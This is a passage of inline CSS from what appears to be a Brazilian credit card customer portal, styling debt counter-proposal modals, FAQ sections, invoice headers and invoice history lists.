         .modal-contraproposta.modal-contraproposta--rejeitada {
         padding: 50px 60px;
         width: 464px; } }
         @media (max-width: 1023px) {
         .modal-contraproposta .modal__actions {
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-direction: column-reverse; }
         .modal-contraproposta .modal__actions .button.button--fixed-size {
         width: 100%; }
         .modal-contraproposta .modal__actions .button--fazer-contraproposta {
         margin-bottom: 10px; } }
         .detalhes-contraproposta .row {
         margin: 0; }
         .detalhes-contraproposta .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .detalhes-contraproposta .block__header .block__header-title .block__header-text {
         padding-left: 0; }
         .detalhes-contraproposta .block__header .block__header-subtitle {
         margin-top: 10px; }
         .detalhes-contraproposta .block__header .block__header-subtitle .block__header-text {
         margin: 0;
         font-size: 18px;
         font-weight: 300; }
         .detalhes-contraproposta .block__resumo {
         border-top: 1px solid #e0e0e0; }
         .detalhes-contraproposta .block__contraproposta {
         padding: 30px 0; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta {
         border-radius: 3px;
         overflow: hidden; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__description {
         background-color: #3ecf7a;
         padding: 5px 0;
         color: #fff;
         font-size: 16px;
         font-weight: 700; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content {
         justify-content: space-around;
         background-color: #f2f2f2;
         padding: 20px;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 300; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content b {
         font-weight: 700; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__desconto {
         color: #3ecf7a;
         font-weight: 700; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__divider {
         display: inline-block;
         position: relative;
         left: -15px;
         -webkit-transform: rotate(-45deg);
         transform: rotate(-45deg);
         border: solid #acacac;
         border-width: 0 1px 1px 0;
         width: 30px;
         height: 30px; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__vencimento {
         font-size: 18px;
         font-weight: 700; }
         .detalhes-contraproposta .block__resumo {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         border-top: 0; }
         .detalhes-contraproposta .block__resumo .resumo-valores {
         margin: 0;
         border: 1px solid #e0e0e0;
         border-top: none;
         padding: 15px 22px 22px;
         list-style: none; }
         .detalhes-contraproposta .block__resumo .resumo-valores .line {
         display: block;
         margin-top: 5px;
         margin-bottom: 9px;
         border-top: 1px solid #e0e0e0;
         width: 100%; }
         .detalhes-contraproposta .block__resumo .resumo-valores .loader--show button {
         min-width: 137px; }
         .detalhes-contraproposta .block__resumo .resumo-valores li {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 10px;
         text-align: right; }
         .detalhes-contraproposta .block__resumo .resumo-valores li:last-of-type,
         .detalhes-contraproposta .block__resumo .resumo-valores li:first-of-type {
         margin-top: 0; }
         .detalhes-contraproposta .block__resumo .resumo-valores .resumo-valores__label {
         color: #706f6f;
         font-size: 12px; }
         .detalhes-contraproposta .block__resumo .resumo-valores .tag-desconto .valor {
         font-size: 14px; }
         .detalhes-contraproposta .block__resumo .resumo-valores .resumo-valores__value {
         letter-spacing: -0.5px;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 700; }
         .detalhes-contraproposta .block__resumo .resumo-valores .resumo-valores__value--entrada {
         margin: 0 5px; }
         .detalhes-contraproposta .block__resumo .resumo-valores .resumo-valores__value--atraso {
         color: #cf3e3e; }
         .detalhes-contraproposta .block__resumo .resumo-valores .resumo-valores__value--alterar-campo {
         margin-top: -3px;
         margin-left: 8px; }
         .detalhes-contraproposta .block__resumo .resumo-valores .resumo-valores__value--huge {
         font-size: 36px; }
         .detalhes-contraproposta .block__footer {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap-reverse;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding-top: 20px; }
         .detalhes-contraproposta .block__footer .button {
         min-width: 200px; }
         @media (max-width: 1023px) {
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__description {
         font-size: 14px; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__label {
         font-size: 12px; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content {
         flex-wrap: wrap;
         background-color: inherit;
         padding: 0; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__entrada-box {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         margin-bottom: 20px;
         border-radius: 0 0 3px 3px;
         background-color: #f2f2f2;
         padding: 10px; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__desconto-box {
         border-right: 1px solid #e0e0e0; }
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__entrada-box,
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__desconto-box,
         .detalhes-contraproposta .block__contraproposta .status-contraproposta .status-contraproposta__content .status-contraproposta__vencimento-box {
         text-align: center; } }
         @media (max-width: 767px) {
         .detalhes-contraproposta .block__contraproposta {
         padding-top: 0; }
         .detalhes-contraproposta .status-contraproposta__desconto-box,
         .detalhes-contraproposta .status-contraproposta__vencimento-box {
         -webkit-box-flex: 1;
         flex: 1; }
         .detalhes-contraproposta .block__footer .loader,
         .detalhes-contraproposta .block__footer .button {
         width: 100%; }
         .detalhes-contraproposta .block__footer .loader {
         margin-bottom: 10px; } }
         .contraproposta .row {
         margin: 0; }
         .contraproposta .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit;
         margin-bottom: 45px; }
         .contraproposta .block__header .block__header-title .block__header-text {
         padding-left: 0; }
         .contraproposta .block__header .block__header-subtitle {
         margin-top: 10px; }
         .contraproposta .block__header .block__header-subtitle .block__header-text {
         margin: 0;
         font-size: 18px;
         font-weight: 300; }
         .contraproposta .block__footer,
         .contraproposta .block__resumo,
         .contraproposta .block__contraproposta {
         border-top: 1px solid #e0e0e0; }
         .contraproposta .block__contraproposta {
         padding: 30px 0; }
         .contraproposta .block__contraproposta .textfield__label {
         left: 0; }
         .contraproposta .block__contraproposta .select-input .select-box .select__label--selected {
         color: unset; }
         .contraproposta .block__contraproposta small.field-message {
         font-style: italic; }
         .contraproposta .block__contraproposta small.field-message:not(.field-message--error) {
         color: #706f6f; }
         .contraproposta .block__contraproposta .select {
         top: 5px;
         margin-bottom: 20px; }
         .contraproposta .block__contraproposta .select:after {
         border-top-color: #1e1e1f; }
         .contraproposta .block__contraproposta .textfield-valor .textfield__input {
         border-bottom-color: #1e1e1f;
         text-align: right; }
         .contraproposta .block__contraproposta .textfield-valor .textfield__input.ng-dirty {
         color: #1e1e1f; }
         .contraproposta .block__contraproposta .textfield-valor .textfield__input:focus ~ .textfield__label,
         .contraproposta .block__contraproposta .textfield-valor .textfield__input.ng-validate.ng-dirty.ng-invalid ~ .textfield__label {
         color: #acacac; }
         .contraproposta .block__contraproposta .textfield-valor .field-message {
         display: none; }
         .contraproposta .block__contraproposta .textfield-valor + .field-message {
         visibility: visible;
         margin-bottom: 10px; }
         .contraproposta .block__resumo {
         padding: 20px 0; }
         .contraproposta .block__resumo .resumo-valores {
         margin: 0;
         list-style: none; }
         .contraproposta .block__resumo .resumo-valores .loader--show button {
         min-width: 137px; }
         .contraproposta .block__resumo .resumo-valores li {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap;
         margin-bottom: 20px;
         text-align: right; }
         .contraproposta .block__resumo .resumo-valores li:last-of-type {
         margin-bottom: 0; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__label {
         text-transform: uppercase;
         color: #acacac;
         font-size: 12px; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__value {
         letter-spacing: -0.5px;
         color: #1e1e1f;
         font-size: 18px;
         font-weight: 700; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__value--entrada {
         margin: 0 5px; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__value--atraso {
         color: #cf3e3e; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__value--desconto {
         color: #3ecf7a; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__value--alterar-campo {
         margin-top: -3px;
         margin-left: 8px; }
         .contraproposta .block__resumo .resumo-valores .resumo-valores__value--huge {
         font-size: 36px; }
         .contraproposta .block__footer {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap-reverse;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding-top: 20px; }
         .contraproposta .block__footer .button {
         min-width: 200px; }
         @media (max-width: 767px) {
         .contraproposta .block__footer .loader,
         .contraproposta .block__footer .button {
         width: 100%; }
         .contraproposta .block__footer .loader {
         margin-bottom: 10px; } }
         .modal.modal-loading-divida {
         padding: 50px 58px 40px;
         width: 768px; }
         .modal.modal-loading-divida .modal__content {
         margin-bottom: 30px; }
         .modal.modal-loading-divida .modal__title {
         margin-bottom: 15px; }
         .modal.modal-loading-divida .modal__content-subtitle {
         font-size: 14px; }
         .modal.modal-loading-divida .modal__content-quotes {
         text-align: center;
         font-weight: 400;
         font-style: italic; }
         .modal.modal-loading-divida .modal__content-quotes .ng-carousel {
         height: 50px; }
         .modal.modal-loading-divida .modal__content-quotes p {
         margin: 0;
         white-space: normal; }
         .modal.modal-loading-divida .modal__actions .button {
         width: 200px; }
         @media (max-width: 767px) {
         .modal.modal-loading-divida {
         width: 320px; } }
         .modal-divida.modal-contraproposta, .modal-divida.modal-sucesso-negociacao {
         width: 464px; }
         .modal-divida.modal-contraproposta p, .modal-divida.modal-sucesso-negociacao p {
         font-size: 14px; }
         .modal-divida .button--ok {
         padding: 0 80px; }
         @media (max-width: 767px) {
         .modal-divida.modal-contraproposta p, .modal-divida.modal-sucesso-negociacao p {
         font-size: 12px; } }
         .erro-dividas-acordos {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         padding: 25px 10px 20px; }
         @media (max-width: 767px) {
         .erro-dividas-acordos .button {
         width: 100%; } }
         .erro-dividas-acordos p {
         margin-top: 9px;
         margin-bottom: 10px;
         color: #cf3e3e; }
         .erro-dividas-acordos .icon svg {
         width: 32px;
         height: 32px;
         color: #cf3e3e; }
      </style>
      <style type="text/css">.duvidas-frequentes__container {
         padding-bottom: 20px; }
         .duvidas-frequentes__container .duvidas-frequentes__categoria-title {
         margin: 0 0 20px;
         line-height: 30px; }
         .duvidas-frequentes__container .duvidas-frequentes__resposta {
         margin-top: -1px;
         border: 1px solid #e0e0e0;
         background-color: #f2f2f2;
         padding: 20px;
         word-wrap: break-word; }
         .duvidas-frequentes__container .duvidas-frequentes__resposta p {
         display: block;
         width: 100%; }
      </style>
      <style type="text/css">.duvidas-frequentes-modal-loja__icon {
         width: 95px; }
         .duvidas-frequentes-modal-loja__title {
         text-transform: none;
         line-height: 26px; }
         .duvidas-frequentes-modal-loja__actions {
         display: -webkit-box;
         display: flex;
         justify-content: space-around; }
         .duvidas-frequentes-modal-loja__actions img {
         width: 130px; }
         .duvidas-frequentes-modal-loja__actions svg {
         width: 130px;
         height: 39px;
         color: black; }
      </style>
      <style type="text/css">.duvidas-frequentes-header .duvidas-frequentes__cartoes {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: reverse;
         flex-direction: row-reverse;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         @media (max-width: 767px) {
         .duvidas-frequentes-header .duvidas-frequentes__cartoes {
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: center;
         justify-content: center; } }
         @media (max-width: 767px) {
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__button-quero-cartao {
         width: 100%;
         height: 48px; } }
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__cartoes-texto {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding: 10px 10px 10px 0;
         width: 100%; }
         @media (max-width: 767px) {
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__cartoes-texto {
         padding-right: 0; } }
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__cartoes-texto .duvidas-frequentes__texto {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100%;
         max-width: 700px; }
         @media (max-width: 767px) {
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__cartoes-texto .duvidas-frequentes__texto p {
         text-align: center; } }
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__cartoes-texto .duvidas-frequentes__quero-cartao {
         width: 270px;
         text-transform: inherit; }
         @media (max-width: 767px) {
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__cartoes-texto .duvidas-frequentes__quero-cartao {
         align-self: center;
         width: 100%; } }
         .duvidas-frequentes-header .duvidas-frequentes__cartoes .duvidas-frequentes__image-cartao {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
      </style>
      <style type="text/css">.duvidas-frequentes__sidebar {
         position: -webkit-sticky;
         position: sticky;
         top: 20px;
         margin-bottom: 500px; }
         .duvidas-frequentes__sidebar .categorias-duvidas {
         height: 340px; }
         .duvidas-frequentes__sidebar .categorias-duvidas nav {
         border: 1px solid #e0e0e0; }
         .duvidas-frequentes__sidebar .categorias-duvidas .categoria-duvidas__link-block {
         padding: 18px; }
         .duvidas-frequentes__sidebar .categorias-duvidas .categorias-duvidas__link {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row;
         -webkit-box-pack: start;
         justify-content: flex-start;
         cursor: pointer;
         width: 100%;
         max-height: 60px;
         text-decoration: inherit; }
         .duvidas-frequentes__sidebar .categorias-duvidas .categorias-duvidas__link.selected {
         color: #fff; }
         .duvidas-frequentes__sidebar .categorias-duvidas .categorias-duvidas__link .categoria-duvidas_icon-svg {
         width: 20px;
         height: 20px; }
         .duvidas-frequentes__sidebar .categorias-duvidas .categorias-duvidas__link .categoria-duvidas_icon-svg svg {
         width: 20px;
         height: 20px; }
         .duvidas-frequentes__sidebar .categorias-duvidas .categorias-duvidas__texto {
         align-content: stretch;
         margin-left: 10px;
         width: 100%;
         text-transform: initial; }
      </style>
      <style type="text/css">.duvidas-frequentes--tracking {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: start;
         justify-content: flex-start;
         padding: 10px 0; }
         .duvidas-frequentes--tracking__button {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         font-size: 14px; }
         .duvidas-frequentes--tracking__button i {
         margin-right: 8px;
         width: 12px; }
         .duvidas-frequentes--tracking__button:last-child {
         margin-left: 10px; }
         .duvidas-frequentes--tracking__container {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap; }
         .duvidas-frequentes--tracking__label {
         margin-right: 10px;
         font-weight: bold; }
         .duvidas-frequentes--tracking__button--container {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .duvidas-frequentes--tracking__feedback {
         font-weight: bold; }
      </style>
      <style type="text/css">.duvidas-frequentes .duvidas-frequentes__separator {
         margin: 30px auto;
         border-color: #e0e0e0; }
         @media (max-width: 767px) {
         .duvidas-frequentes .duvidas-frequentes__separator {
         border: none; } }
         .duvidas-frequentes h3 {
         margin: 30px 0 0; }
      </style>
      <style type="text/css">@media (max-width: 1023px) {
         .extrato-fatura-cabecalho .cabecalho-fatura__status .status-fatura.mensagem-fatura-pendente, .extrato-fatura-cabecalho .cabecalho-fatura__status .status-fatura.mensagem-fatura-paga, .extrato-fatura-cabecalho .cabecalho-fatura__status .status-fatura.mensagem-fatura-parcial {
         width: auto;
         font-size: 12px; }
         .extrato-fatura-cabecalho .block__header-tooltip .tooltip__box .tooltip__box-link {
         width: 15px;
         height: 15px; }
         .extrato-fatura-cabecalho .block__header-tooltip .tooltip__box .tooltip__box-content {
         top: 30px;
         right: -50%;
         width: 240px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__total-fatura {
         -webkit-box-ordinal-group: 2;
         order: 1;
         margin-bottom: 3px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__pagamento-minimo {
         -webkit-box-ordinal-group: 5;
         order: 4;
         margin-bottom: 3px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__pagamento-parcelado {
         -webkit-box-ordinal-group: 6;
         order: 5;
         margin-bottom: 3px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__vencimento {
         -webkit-box-ordinal-group: 3;
         order: 2;
         margin-bottom: 3px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__melhor-dia {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .extrato-fatura-cabecalho .cabecalho-fatura__valor-pago {
         -webkit-box-ordinal-group: 7;
         order: 6; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura__total-fatura,
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura__vencimento {
         margin-bottom: 3px; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura--item {
         margin-bottom: 0;
         font-size: 11px; }
         .extrato-fatura-cabecalho .button__codigo-boleto {
         -webkit-box-ordinal-group: 3;
         order: 2;
         padding-left: 7px; }
         .extrato-fatura-cabecalho .button__fatura-pdf {
         -webkit-box-ordinal-group: 2;
         order: 1;
         padding-right: 7px; }
         .extrato-fatura-cabecalho .button__codigo-boleto .button,
         .extrato-fatura-cabecalho .button__fatura-pdf .button {
         padding: 0;
         font-size: 16px; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__pagamento-parcelado {
         padding-right: 0;
         padding-left: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__pagamento-parcelado .parcelamento {
         letter-spacing: normal;
         font-size: 11px; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__total-fatura {
         padding-right: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__vencimento .property {
         -webkit-box-pack: center;
         justify-content: center; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__pagar-fatura {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         -webkit-box-ordinal-group: 4;
         order: 3;
         margin-bottom: 20px;
         border-top: 1px solid #e0e0e0;
         padding-top: 18px; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__pagar-fatura .button__codigo-boleto {
         width: 50%; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__status {
         -webkit-box-ordinal-group: 7;
         order: 6;
         border-top: 1px solid #e0e0e0;
         border-left: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__status p {
         margin-top: 15px; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__melhor-dia .property__label,
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__melhor-dia .property__value {
         text-align: center; }
         .extrato-fatura-cabecalho .cabecalho-fatura .property__icon {
         margin-right: 10px;
         width: 27px;
         height: 27px; }
         .extrato-fatura-cabecalho .cabecalho-fatura .property.property--small-font .property__label {
         font-size: 11px; }
         .extrato-fatura-cabecalho .cabecalho-fatura .property.property--small-font .property__value {
         font-size: 14px; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .extrato-fatura-cabecalho .row.row-inferior {
         margin: 10px 12px 0;
         padding-left: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-fatura--item.cabecalho-fatura__pagar-fatura {
         margin-top: 0;
         margin-bottom: 15px;
         padding-top: 25px; }
         .extrato-fatura-cabecalho .block__header-tooltip .tooltip__box .tooltip__box-content {
         top: -23px;
         right: 27px; } }
         @media (max-width: 767px) {
         .extrato-fatura-cabecalho .row.row-inferior {
         margin-top: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item {
         text-align: center; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__total-fatura, .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo, .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__melhor-dia, .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__valor-pago {
         padding-right: 0;
         padding-left: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__total-fatura, .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo {
         margin-bottom: 10px; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo, .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-parcelado {
         padding-top: 10px; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__valor-pago {
         margin-bottom: 0;
         padding-top: 17px;
         padding-bottom: 14px; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__valor-pago.small-6 {
         margin: 0;
         border: 0;
         padding-left: 20px;
         text-align: left; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo {
         padding-left: 20px; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__pagar-fatura {
         margin-top: 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__melhor-dia {
         border-top: 1px solid #e0e0e0;
         padding-top: 10px;
         padding-bottom: 5px; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura .row {
         margin: 0; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura .row .cabecalho-fatura--item {
         margin-top: 10px; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura .row .cabecalho-fatura--item.cabecalho-fatura__melhor-dia {
         border-bottom: 1px solid #e0e0e0;
         padding-top: 10px;
         padding-bottom: 5px; } }
         .extrato-fatura-cabecalho .cabecalho-fatura .cabecalho-superior-fatura {
         width: 100%; }
         .extrato-fatura-cabecalho .row-inferior {
         margin-top: 10px;
         margin-right: auto;
         margin-left: auto;
         background: #f2f2f2; }
         .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__pagamento-parcelado, .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__pagamento-minimo, .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__valor-pago {
         padding-top: 15px;
         padding-bottom: 5px; }
         .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__status .mensagem-fatura-paga,
         .extrato-fatura-cabecalho .row-inferior .cabecalho-fatura--item.cabecalho-fatura__status .mensagem-fatura-parcial {
         margin: 20px 0; }
         .extrato-fatura-cabecalho .cabecalho-fatura__pagar-fatura {
         margin-top: -10px; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura .row {
         margin: 0; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura .row .cabecalho-fatura--item {
         padding: 0; }
         .extrato-fatura-cabecalho .row-superior {
         margin: 0;
         margin-top: 5px; }
         .extrato-fatura-cabecalho .status-fatura {
         margin-top: 26px;
         text-align: center;
         line-height: 16px;
         font-size: 14px;
         font-weight: 700; }
         .extrato-fatura-cabecalho .tooltip__box-link {
         width: 18px;
         height: 18px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status {
         border-left: 1px solid #e0e0e0; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .tooltip-wrapper {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .tooltip-wrapper .block__header-tooltip {
         margin-top: 15px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .tooltip-wrapper .tooltip__box {
         padding: 0 0 10px 8px;
         color: #d71920; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .tooltip-wrapper .block__header-tooltip {
         z-index: 2; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .tooltip__box-content {
         right: 32px;
         width: 250px; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .border-valor-pago {
         border-left: 1px solid #e0e0e0; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .mensagem-fatura-paga {
         color: #3ecf7a; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .mensagem-fatura-parcial {
         color: #ac8947; }
         .extrato-fatura-cabecalho .cabecalho-fatura__status .mensagem-fatura-pendente {
         margin-top: 19px;
         width: 85px;
         color: #d71920; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item.cabecalho-fatura__total-fatura .property__icon {
         margin-right: 7px; }
         .extrato-fatura-cabecalho .cabecalho-fatura--item .parcelamento {
         display: block;
         margin-top: -4px;
         cursor: pointer;
         letter-spacing: -0.5px;
         font-size: 13px; }
         .extrato-fatura-cabecalho .cabecalho-fatura-acoes .button__codigo-boleto .button {
         margin-bottom: 3px; }
         .extrato-fatura-cabecalho .extrato-fatura__proxima .cabecalho-fatura--item {
         margin-bottom: 0;
         font-size: 13px; }
         section.cartao-renner .extrato-fatura-cabecalho .cabecalho-fatura__status {
         display: none; }
      </style>
      <style type="text/css">.no-padding-l {
         padding-left: 0 !important; }
         .no-padding-r {
         padding-right: 0 !important; }
         .no-padding-lr {
         padding-right: 0 !important;
         padding-left: 0 !important; }
         .text-capitalize {
         text-transform: capitalize !important; }
         .text-upper {
         text-transform: uppercase !important; }
         .text-lower {
         text-transform: lowercase !important; }
         .text-normal {
         text-transform: none !important; }
         .text-bold {
         font-weight: 700 !important; }
         .text-light {
         font-weight: 300 !important; }
         .text-left {
         text-align: left; }
         .text-right {
         text-align: right; }
         .text-center {
         text-align: center; }
         .align-middle {
         -webkit-box-align: center;
         align-items: center; }
         .block {
         display: block; }
         .no-margin-bottom {
         margin-bottom: 0; }
         @media (min-width: 768px) {
         .mb-15 {
         margin-bottom: 15px; } }
         @media only screen and (max-width: 767px) {
         .no-padding-l {
         padding-left: 10px !important; }
         .no-padding-r {
         padding-right: 10px !important; }
         .no-padding-lr {
         padding-right: 10px !important;
         padding-left: 10px !important; } }
         .tab-body .tab-panel.tab-cabecalho {
         padding-right: 0;
         padding-left: 0; }
         .fatura__header-title {
         margin: 3px 0 10px;
         font-size: 22px;
         font-weight: 300; }
         .fatura__troca-produto {
         display: inline-block;
         position: relative;
         margin-top: 7px;
         text-decoration: none; }
         .fatura__troca-produto-icon {
         position: absolute;
         top: 50%;
         left: 0;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%); }
         .fatura .loader--inverse {
         display: grid;
         min-height: 80px; }
         .fatura .loader__block {
         min-height: 150px; }
         .edge .fatura .loader--inverse {
         display: block; }
         .fatura__troca-produto-text {
         display: inline-block;
         padding-right: 15px;
         padding-left: 34px;
         text-align: left;
         text-transform: none; }
         .fatura__troca-produto-text:after {
         display: inline-block;
         position: absolute;
         top: 50%;
         right: 0;
         -webkit-transform: rotate(-45deg) translateY(-50%);
         transform: rotate(-45deg) translateY(-50%);
         border: solid;
         border-width: 0 1px 1px 0;
         padding: 3px;
         content: ""; }
         .ie faturas,
         .ie tab-set,
         .ie .fatura loader {
         display: block; }
         .fatura tab-header-item {
         -webkit-box-flex: 1;
         flex: 1 1 auto;
         width: inherit; }
         .fatura .ir-versao-completa {
         margin-top: 20px;
         border: 1px solid #e0e0e0;
         padding-right: 10px;
         padding-left: 10px; }
         @media (max-width: 767px) {
         .fatura__header-title {
         margin-bottom: 15px;
         padding-right: 0;
         font-size: 18px; }
         .fatura__header-title--secundario {
         font-size: 16px; } }
         .fatura tab-header-item.tab-historico-faturas {
         -webkit-box-flex: inherit;
         flex: inherit; }
         .fatura tab-header-item.tab-historico-faturas .tab-historico-faturas__icon {
         margin: 0 10px;
         width: 20px;
         height: 20px; }
      </style>
      <style type="text/css">.historico-fatura .loader {
         min-height: 70px; }
         .historico-fatura .tab-body .tab-panel {
         padding: 5px 0; }
         .historico-fatura .historico-fatura__list {
         margin: 0;
         list-style: none; }
         .ie .historico-fatura .historico-fatura__fatura {
         height: 55px; }
         .historico-fatura .historico-fatura__fatura {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-bottom: 1px solid #e0e0e0;
         padding: 5px 20px;
         min-height: 55px; }
